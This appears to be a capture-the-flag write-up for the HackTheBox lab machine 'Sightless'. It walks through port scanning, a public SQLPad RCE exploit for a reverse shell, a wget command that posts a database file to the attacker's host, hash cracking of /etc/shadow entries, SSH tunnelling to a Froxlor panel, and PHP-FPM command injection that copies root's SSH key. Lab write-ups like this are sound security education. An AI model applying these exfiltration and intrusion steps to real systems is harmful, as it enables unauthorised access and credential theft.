{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("Let's begin by scanning all the ports.")}}

{{console("nmap -T5 -p- -sC 10.10.11.32", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 19:51 CET
Warning: 10.10.11.32 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.32
Host is up (0.063s latency).
Not shown: 65279 closed tcp ports (reset), 253 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://sightless.htb/

Nmap done: 1 IP address (1 host up) scanned in 290.08 seconds")}}

{{text("We find 3 open ports.")}}

{{list(['21 (FTP)', '22 (SSH)', '80 (HTTP)'])}}

{{text("Since anonymous login didn't work the FTP server, I proceeded with the web page after adding <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://sightless.htb/</code> to my <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{image("../../static/writeups/sightless/images/000001.jpg")}}
{}
{{text("Most interesting thing I found was the redirection to the subdomain upon clicking one of the buttons. Once again I added that as an entry and visited the subdomain.")}}

{{image("../../static/writeups/sightless/images/000002.jpg")}}

{{text("It is a tool for executing SQL queries. I found out that the currently used version is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>6.10.0</code> from the 'About' page in the top-right.")}}

{{text("While searching for an exploit to that version, I found this.")}}

{{link("https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944", "", "SQLPad RCE Exploit")}}

{{text("I used the exploit and successfully got a reverse shell on the machine.")}}

{{image("../../static/writeups/sightless/images/000003.jpg")}}

{{header("Shell as michael", "shell-as-michael")}}

{{text("We already are the root user, however, there are no flags for us to read.")}}

{{text("I couldn't find anything else interesting, except for the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sqlpad.sqlite</code> file in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/lib/sqlpad</code> directory.")}}

{{text("In order to transfer the file, I created a python script that will start a HTTP server accepting POST requests and used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wget</code> on the target machine to transfer the file.")}}

{{console("cat server.py", "from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class FileUploadHandler(BaseHTTPRequestHandler):
    upload_dir = 'uploads'

    def do_POST(self):
        # Read the content length from headers
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Create the directory if it does not exist
        os.makedirs(self.upload_dir, exist_ok=True)

        # Save the file with a default name
        file_path = os.path.join(self.upload_dir, 'uploaded_file')
        with open(file_path, 'wb') as f:
            f.write(post_data)

        # Send a success response
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        # Respond to a GET request
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'This server accepts POST requests to upload files')

# Start the server
if __name__ == '__main__':
    host = '0.0.0.0'
    port = 8000
    print(f'Server running on http://{host}:{port}')
    server = HTTPServer((host, port), FileUploadHandler)
    server.serve_forever()")}}

{{console("wget --method=POST --body-file=sqlpad.sqlite http://10.10.14.159:8000/", "--2025-01-01 19:43:32--  http://10.10.14.159:8000/
Connecting to 10.10.14.159:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified
Saving to: 'uploaded_file'

     0K                                                        4.08M=0s

2025-01-01 19:43:33 (4.08 MB/s) - 'uploaded_file' saved [26]")}}

{{text("I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sqlitebrowser</code> to browse through the data and found an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code> user together with his hashed password.")}}

{{image("../../static/writeups/sightless/images/000004.jpg")}}

{{text("Copy the hash into a file, and crack it with either <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> or <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hashcat</code>.")}}

{{console("john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt", "Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]            (?)     
1g 0:00:02:31 DONE (2025-01-01 23:41) 0.006610g/s 131.3p/s 131.3c/s 131.3C/s bernadeth..villalobos
Use the '--show' option to display all of the cracked passwords reliably
Session completed.")}}

{{text("I tried using the password that I got to log in to the FTP server, but it was incorrect. With no more ideas, I came back to my reverse shell.")}}

{{text("I read the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/shadow</code> file and got the password hash of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>michael</code>. I cracked it using the same method and logged in as him with SSH.")}}

{{header("Froxlor web page", "froxlor-web-page")}}

{{text("As the user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>michael</code> I was able to see a flag in my home directory.")}}

{{image("../../static/writeups/sightless/images/000005.jpg")}}

{{text("Looking through the system, I noticed an interesting entry in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{console("cat /etc/hosts", "127.0.0.1 localhost                                                                                                
127.0.1.1 sightless                                                                                                
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb                                                   
                                                                                                                   
# The following lines are desirable for IPv6 capable hosts                                                         
::1     ip6-localhost ip6-loopback                                                                                 
fe00::0 ip6-localnet                                                                                               
ff00::0 ip6-mcastprefix                                                                                            
ff02::1 ip6-allnodes                                                                                               
ff02::2 ip6-allrouters")}}

{{text("There is an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code> subdomain, but I couldn't reach it from my machine.")}}

{{text("Upon checking if there are any more services running, I got something new.")}}

{{console("netstat -tulnp", "(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:59477         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36959         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41229         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   ")}}

{{text("There was a service running on the port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>8080</code> which I immedietally thought is the subdomain we found, since this port is often used by web servers.")}}

{{text("I accessed this service from my own machine by using SSH.")}}

{{console("ssh -L 8080:localhost:8080 michael@10.10.11.32")}}

{{text("Now if I went to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://localhost:8080</code>, I should be able to view the web page.")}}

{{image("../../static/writeups/sightless/images/000006.jpg")}}

{{text("Now we should try to access the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code> subdomain.")}}

{{text("Add an entry to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{console("cat /etc/hosts", "...
127.0.0.1 admin.sightless.htb")}}

{{text("Now we visit the subdomain.")}}

{{image("../../static/writeups/sightless/images/000007.jpg")}}

{{text("I thought that we finally have a place to use the credentials we got an hour ago from the database file, but that would be too easy.")}}

{{text("This for me was the hardest part. What I did is I forwarded all the ports that were open and used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Chrome Debugger</code> to monitor all the network traffic.")}}

{{console("ssh -L 8080:localhost:8080 -L 33060:localhost:33060 -L 41229:localhost:41229 -L 36959:localhost:36959 -L 59477:localhost:59477 -L 3306:localhost:3306 michael@10.10.11.32")}}

{{image("../../static/writeups/sightless/images/000008.jpg")}}

{{text("Make sure to add the correct ports in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Configure</code> tab.")}}

{{text("Now click on the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Inspect</code> button and look for the correct login credentials.")}}

{{image("../../static/writeups/sightless/images/000009.jpg")}}

{{text("With those, you can now log in to the admin panel.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Now logged in, I noticed that it is possible for us to run commands on the system through the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PHP-FPM versions</code> tab.")}}

{{image("../../static/writeups/sightless/images/000010.jpg")}}

{{text("I created a command that copied the root's id_rsa key to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp</code> and added read permissions to it. Make sure to disable and enable PHP-FPM in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Settings</code> tab so that the commands get ran.")}}

{{image("../../static/writeups/sightless/images/000011.jpg")}}

{{text("Now with the key, we can simply log in as the root and read the flag.")}}

{{image("../../static/writeups/sightless/images/000012.jpg")}}

{{script()}}